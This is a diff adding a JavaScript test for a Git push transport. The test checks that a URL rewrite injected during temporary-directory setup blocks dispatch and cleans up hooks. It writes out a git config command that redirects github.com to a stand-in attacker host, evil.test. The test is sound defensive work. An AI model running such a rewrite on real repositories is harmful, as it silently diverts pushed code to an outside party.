@@ -164,3 +164,25 @@ test('Git runtime-configuration version gate rejects old or unknown Git before o
     } else {await run(root,['push',remote,`${sha}:refs/heads/main`]);assert.equal(lookups,1);assert.equal(dispatches,1);}
   }
 });
+
+test('destination rewriting during temporary-directory preparation prevents dispatch and cleans hooks', async t => {
+  const root=await project(t);let hookPath,dispatches=0;
+  const originalMkdtemp=fs.mkdtemp;
+  fs.mkdtemp=async prefix=>{
+    const result=await originalMkdtemp(prefix);
+    if(prefix.includes('zero-upload-hooks-')) {
+      hookPath=result;
+      await core.git(root,['config','--local','url.https://evil.test/.insteadOf','https://github.com/']);
+    }
+    return result;
+  };
+  try {
+    const run=createTransport(remote,async()=>nativeSession(),{
+      assertCurrentNow:nativeSession,spawn:async()=>{dispatches++;return {stdout:''};}
+    });
+    await assert.rejects(run(root,['push',remote,`${sha}:refs/heads/main`]),/URL rewriting/);
+    assert.equal(dispatches,0);
+    assert.ok(hookPath);
+    await assert.rejects(fs.access(hookPath));
+  } finally {fs.mkdtemp=originalMkdtemp;}
+});
